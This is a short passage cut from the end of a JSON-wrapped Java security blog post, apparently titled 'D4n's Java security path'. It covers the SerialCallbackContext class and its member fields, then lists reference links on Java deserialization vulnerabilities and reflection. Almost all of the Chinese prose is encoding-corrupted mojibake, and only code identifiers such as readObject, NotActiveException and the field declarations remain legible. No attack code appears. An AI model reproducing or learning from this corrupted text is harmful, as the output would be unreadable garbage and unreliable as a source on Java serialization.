å®ƒçš„çº¿ç¨‹ï¼Œå¹¶ä¸”åªå…è®¸ä¸€ä¸ªdefaultReadObject, readFields, defaultWriteObjectæˆ–writeFieldsçš„è°ƒç”¨ï¼Œè¿™äº›å¿…é¡»åœ¨ç±»çš„readObject/writeObjectæ–¹æ³•è¿”å›ä¹‹å‰åœ¨åŒä¸€ä¸ªçº¿ç¨‹ä¸Šè°ƒç”¨ã€‚å¦‚æœæœªè®¾ç½®ä¸ºå½“å‰çº¿ç¨‹ï¼ŒgetObjæ–¹æ³•å°†æŠ›å‡ºNotActiveExceptionã€‚\næœ‰å¦‚ä¸‹æˆå‘˜å˜é‡ï¼š\nè¢«æ“ä½œçš„Objectï¼Œå†…å«çš„å¯¹è±¡æµç±»ï¼Œå½“å‰æ“ä½œçº¿ç¨‹\n1 2 3 private final Object obj; private final ObjectStreamClass desc; private Thread thread; å‚è€ƒé“¾æ¥ Javaååºåˆ—åŒ–æ¼æ´ä»å…¥é—¨åˆ°æ·±å…¥\nJAVAååºåˆ—åŒ–æ¼æ´åŸºç¡€åŸç†\nJava ä¸­åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼Œçœ‹è¿™ç¯‡å°±å¤Ÿäº†ï¼\nJava æ—¥çœ‹ä¸€ç±»ï¼ˆ53ï¼‰ä¹‹IOåŒ…ä¸­çš„SerialCallbackContextç±»\nJava I/O 25 - BlockDataInputStream\nå¤§ç™½è¯è¯´Javaåå°„ï¼šå…¥é—¨ã€ä½¿ç”¨ã€åŸç†\nJAVAå®‰å…¨åŸºç¡€ï¼ˆäºŒï¼‰\u0026ndash; åå°„æœºåˆ¶\nJavaç§æœ‰æ„é€ å‡½æ•°çš„ä½¿ç”¨\nJavaæ³›å‹è¯¦è§£ï¼Œå²ä¸Šæœ€å…¨å›¾æ–‡è¯¦è§£\n","date":"2023-04-06T00:00:00Z","permalink":"https://d4n-sec.github.io/p/d4n%E7%9A%84java%E5%AE%89%E5%85%A8%E8%B7%AF/","title":"D4nçš„Javaå®‰å…¨è·¯"}]